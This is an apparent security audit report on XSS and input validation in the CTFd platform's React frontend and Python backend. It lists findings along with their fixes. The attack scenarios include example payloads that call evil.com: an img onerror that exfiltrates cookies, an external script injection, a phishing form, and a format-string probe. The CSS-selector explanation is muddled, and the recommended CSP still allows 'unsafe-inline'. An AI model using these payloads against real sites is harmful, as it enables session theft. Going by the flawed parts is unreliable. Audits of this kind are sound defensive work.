# Security Deep-Dive: Input Validation & XSS

**OWASP Reference**: WSTG-INPV (Input Validation), WSTG-CLNT (Client-Side Testing)
**Risk Level**: **CRITICAL**
**Files Analyzed**: 25+ (all files with `dangerouslySetInnerHTML`, `innerHTML`, DOM manipulation)

---

## Methodology

Audited every occurrence of:

- `dangerouslySetInnerHTML` — 6 occurrences found
- `innerHTML`, `document.write`, `eval()`, `new Function()` — 0 occurrences
- `react-markdown` configuration
- `rehype-raw` usage
- Plugin script loading (SSRF / XSS via script injection)
- CSS selector injection in DOM queries
- File URL / href injection

---

## DOM XSS Analysis

### All `dangerouslySetInnerHTML` Locations

| Component                      | File:Line                                                   | DOMPurify? | Status       |
| ------------------------------ | ----------------------------------------------------------- | ---------- | ------------ |
| `ChallengeDescriptionRenderer` | `challenges/components/ChallengeDescriptionRenderer.tsx:78` | ✅ Yes     | Safe         |
| **`HintPanel`**                | **`challenges/components/HintPanel.tsx:107`**               | **❌ NO**  | **CRITICAL** |
| **`StaticPage`**               | **`pages/pages/StaticPage.tsx:88`**                         | **❌ NO**  | **CRITICAL** |
| `PluginChallengeRenderer`      | `admin/plugin/components/PluginChallengeRenderer.tsx:19`    | ✅ Yes     | Safe         |
| `PluginFlagFormRenderer`       | `admin/plugin/components/PluginFlagFormRenderer.tsx:11`     | ✅ Yes     | Safe         |
| `PluginFormRenderer`           | `admin/plugin/components/PluginFormRenderer.tsx:31`         | ✅ Yes     | Safe         |

---

## Detail Findings

### 🔴 [CRITICAL] WSTG-INPV-02: Stored XSS — HintPanel

**File**: `frontend/src/features/challenges/components/HintPanel.tsx:107`
**Code**:

```tsx
<div
  dangerouslySetInnerHTML={{ __html: hintData.content }}
  className="prose prose-sm dark:prose-invert max-w-none"
/>
```

**Attack Scenario**:

1. Admin (or attacker with admin access) creates a hint containing: `<img src=x onerror=fetch('https://evil.com/steal?'+document.cookie)>`
2. Backend stores content raw — `build_markdown()` with `CMARK_OPT_UNSAFE` passes raw HTML through
3. Any player who unlocks the hint triggers the XSS
4. Attacker steals session cookies, CSRF tokens, or performs actions as the victim

**Why Critical**: `dompurify` is already in `package.json` but NOT used here. Every other component that uses `dangerouslySetInnerHTML` uses DOMPurify — this is an oversight.

**Remediation** (5 min):

```tsx
import DOMPurify from "dompurify";
// ...
<div
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(hintData.content || ""),
  }}
/>;
```

---

### 🔴 [CRITICAL] WSTG-INPV-02: Stored XSS — StaticPage

**File**: `frontend/src/features/pages/pages/StaticPage.tsx:88`
**Code**:

```tsx
<div dangerouslySetInnerHTML={{ __html: page.content }} />
```

**Attack Scenario**:

1. Admin creates a page with: `<script src="https://evil.com/hook.js"></script>`
2. Backend may or may not sanitize (depends on config — `html_sanitization` toggle)
3. Every visitor to that page executes the script

**Remediation** (5 min):

```tsx
import DOMPurify from "dompurify";
// ...
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(page.content) }} />;
```

---

### 🟠 [HIGH] WSTG-CLNT-03: CMARK_OPT_UNSAFE — Backend Raw HTML in Markdown

**File**: `CTFd/utils/__init__.py:18-23`
**Code**:

```python
def markdown(md):
    return cmarkgfm.markdown_to_html_with_extensions(
        md,
        extensions=["autolink", "table", "strikethrough"],
        options=Options.CMARK_OPT_UNSAFE,
    )
```

**Attack Scenario**: Any user/admin content passed through `markdown()` can include raw HTML. While `nh3` sanitization may strip scripts, it allows tags like `<form>`, `<input>`, `<iframe>`, `<svg>`. A malicious form can be injected for phishing:

```html
<form action="https://evil.com/steal" method="POST">
  <input type="hidden" name="flag" value="CTF{...}" />
  <input type="submit" value="View Challenge" />
</form>
```

**Remediation**:

```python
options=Options.CMARK_OPT_DEFAULT,  # or CMARK_OPT_SMART
```

Or remove the `CMARK_OPT_UNSAFE` option entirely.

---

### 🟠 [HIGH] WSTG-CLNT-15: Server-Side Template Injection via safe_format

**File**: `CTFd/utils/config/pages.py:12-33`, `CTFd/utils/formatters/`
**Attack Scenario**: If `ctf_name` or other config values contain Python format string syntax like `{ctf_name.__class__.__mro__}`, the `safe_format` function may leak server-side internals.

**Remediation**: Audit `safe_format` implementation to ensure it only passes explicit kwargs with no access to `locals()`/`globals()`.

---

### 🟡 [MEDIUM] WSTG-CLNT-01: CSS Selector Injection in Script Dedup

**File**: `frontend/src/features/challenges/components/ChallengeDescriptionRenderer.tsx:58`
**Code**:

```tsx
if (document.querySelector(`script[src="${src}"]`)) return;
```

**Attack Scenario**: If `src` contains a double quote (`"`), it breaks out of the CSS selector:

```
src = `https://evil.com/script.js"]
```

Resulting query: `script[src="https://evil.com/script.js"]")` — this is a valid CSS selector that matches a `script` element with `src` attribute equal to `https://evil.com/script.js` followed by `]` and `)`. The `"]` breaks out of the selector syntax, potentially causing it to match incorrectly.

**Remediation**:

```tsx
const escapedSrc = src.replace(/["\\]/g, "\\$&");
document.querySelector(`script[src="${escapedSrc}"]`);
```

Or use a Set-based dedup approach instead of DOM querying.

---

### 🟡 [MEDIUM] WSTG-CLNT-01: PluginScriptLoader — No Origin Validation

**File**: `frontend/src/features/admin/plugin/components/PluginScriptLoader.tsx:16-18`
**Code**:

```tsx
const script = document.createElement("script");
script.src = src;
document.body.appendChild(script);
```

**Attack Scenario**: If a plugin provides a `src` pointing to `https://evil.com/steal.js`, the script executes in CTFd's origin context. Malicious plugins or supply-chain attacks could inject arbitrary JS.

**Remediation**: Validate origin:

```tsx
const url = new URL(src, window.location.origin);
if (url.origin !== window.location.origin) {
  console.warn(`Blocked script from external origin: ${src}`);
  return;
}
```

---

### 🟡 [MEDIUM] WSTG-CLNT-04: Challenge File href No Protocol Validation

**File**: `frontend/src/features/challenges/components/ChallengeModal.tsx:163-165`
**Code**:

```tsx
<a href={file} target="_blank" rel="noopener noreferrer">
```

**Remediation**:

```tsx
const safeUrl = file?.startsWith("javascript:") ? "#" : file;
```

---

### 🔵 [LOW] Rehype-raw Unused Dependency

**File**: `frontend/package.json:49`: `"rehype-raw": "^7.0.0"`
**Finding**: `rehype-raw` allows raw HTML in react-markdown. Currently it's unused but should be removed to prevent accidental use.

---

## CSP Analysis

**Current**: NO Content Security Policy header set.
**Impact**: All XSS findings have zero defense-in-depth mitigation.

**Recommended Minimum CSP**:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  connect-src 'self' ws:;
```

---

## Summary

| Finding                                            | Risk                | File                                  | Fix                           |
| -------------------------------------------------- | ------------------- | ------------------------------------- | ----------------------------- |
| HintPanel dangerouslySetInnerHTML tanpa DOMPurify  | Critical            | `HintPanel.tsx:107`                   | Tambah `DOMPurify.sanitize()` |
| StaticPage dangerouslySetInnerHTML tanpa DOMPurify | Critical            | `StaticPage.tsx:88`                   | Tambah `DOMPurify.sanitize()` |
| CMARK_OPT_UNSAFE backend markdown                  | High                | `CTFd/utils/__init__.py:22`           | Ganti ke `CMARK_OPT_DEFAULT`  |
| SSTI via safe_format                               | High                | `CTFd/utils/config/pages.py:26`       | Audit safe_format             |
| CSS selector injection                             | Medium              | `ChallengeDescriptionRenderer.tsx:58` | Escape src string             |
| PluginScriptLoader no origin check                 | Medium              | `PluginScriptLoader.tsx:17`           | Validate origin               |
| File href no protocol validation                   | Medium              | `ChallengeModal.tsx:163`              | Block javascript: URLs        |
| No CSP header                                      | Critical (systemic) | Backend `__init__.py`                 | Add CSP middleware            |
| rehype-raw unused                                  | Low                 | `package.json:49`                     | Remove dependency             |
